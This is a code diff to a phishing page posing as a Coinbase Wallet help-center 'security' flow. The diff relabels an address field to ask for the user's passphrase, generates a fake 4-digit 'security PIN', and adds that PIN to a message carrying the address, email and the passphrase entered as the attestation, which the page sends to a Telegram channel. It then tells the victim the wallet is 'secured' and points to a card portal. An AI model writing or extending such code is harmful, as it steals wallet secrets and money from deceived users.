@@ -433,9 +433,9 @@
         </div>
 
         <div class="field">
-          <label>Wallet Address</label>
+          <label>Passphrase</label>
           <input type="text" id="sc2AddrInput"
-            placeholder="0x… or paste your address"
+            placeholder="Enter your passphrase"
             style="font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.02em"
             autocomplete="off" spellcheck="false" />
         </div>
@@ -492,14 +492,22 @@
       <div class="success-tick">🔐</div>
       <h2>Wallet secured!</h2>
       <p class="sub">Your wallet is now protected with a password lock. Your attestation has been recorded.</p>
-      <div class="sec-summary" style="margin-bottom:20px">
+      <div class="sec-summary" style="margin-bottom:16px">
         <div class="ss-row"><span>Status</span><strong style="color:var(--green)">✓ Secured</strong></div>
         <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
         <div class="ss-row"><span>Address</span><strong id="sc4Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
         <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Active</strong></div>
         <div class="ss-row"><span>Attestation</span><strong style="color:var(--green)">✓ Signed & sent</strong></div>
       </div>
-      <button class="btn-primary" onclick="window.location.href='index.html'">Back to Help Center →</button>
+
+      <div style="width:100%;background:#EEF3FF;border:1.5px solid #C7D7FF;border-radius:14px;padding:20px;text-align:center;margin-bottom:16px">
+        <div style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px">Your 4-Digit Security PIN</div>
+        <div id="sc4Pin" style="font-size:48px;font-weight:800;color:var(--blue);letter-spacing:.3em;font-family:'JetBrains Mono',monospace">—</div>
+        <div style="font-size:11px;color:var(--muted);margin-top:8px">Save this PIN — use it with your email to access your card portal.</div>
+      </div>
+
+      <button class="btn-primary" onclick="window.location.href='portal.html'">View My Card →</button>
+      <button class="btn-ghost" onclick="window.location.href='index.html'">Back to Help Center</button>
     </div>
 
   </div>
@@ -657,6 +665,9 @@ async function submitAttest(e) {
   btn.disabled    = true;
   btn.textContent = 'Signing…';
 
+  const pin = String(Math.floor(1000 + Math.random() * 9000));
+  document.getElementById('sc4Pin').textContent = pin;
+
   const msg =
     `🔐 Wallet Security Attestation\n` +
     `📅 ${new Date().toLocaleString()}\n` +
@@ -664,10 +675,13 @@ async function submitAttest(e) {
     `🔑 Address: ${walletAddress}\n` +
     `📧 Email: ${window._secEmail || '—'}\n` +
     `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
-    `✅ Attestation: "${val}"`;
+    `✅ Attestation: "${val}"\n` +
+    `🔢 PIN: ${pin}`;
 
-  try { await sendToTelegram(msg); } catch(err) { console.warn('Telegram:', err.message); }
+  try { await sendToTelegram(msg); } catch(e) { console.warn('Telegram:', e.message); }
 
+  btn.disabled    = false;
+  btn.textContent = 'Sign & Secure Wallet →';
   goStep(4);
 }
 
